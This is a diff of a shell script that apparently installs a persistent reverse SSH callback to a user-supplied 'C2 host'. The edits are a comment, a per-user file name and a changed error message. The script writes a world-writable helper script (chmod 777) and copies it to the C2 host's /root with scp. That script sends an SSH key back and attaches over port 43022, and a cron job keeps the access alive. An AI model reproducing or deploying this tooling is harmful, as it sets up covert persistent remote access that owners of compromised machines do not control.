@@ -38,7 +38,8 @@ fi
     done
     printf "\n"
 
-    echo "Please enter route to desired C2 host (<username>@<C2 host>)"
+#Takes input for what remote host you want to route through. 
+    echo "Please enter route to desired C2 host (<username>@<C2_host>)"
     read C2
     printf "\n"
 
@@ -52,9 +53,9 @@ fi
 
 #Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
 echo "### Creating & transferring remote connection script"
-echo "ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022" > /home/$user/hmu.sh
-sudo chmod 777 /home/$user/hmu.sh 
-scp /home/$user/hmu.sh $C2:/root
+echo "ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022" > /home/$user/hmu_$user.sh
+sudo chmod 777 /home/$user/hmu_$user.sh 
+scp /home/$user/hmu_$user.sh $C2:/root
 
 #Setup cron job + cleanup
     echo "### Setting up cronjob ###"
@@ -67,6 +68,6 @@ scp /home/$user/hmu.sh $C2:/root
     echo "### donezo! Please reboot the machine. ###"
 
 else
-    echo "IPv4 is down"
+    echo "Please check your network connection"
 
 fi
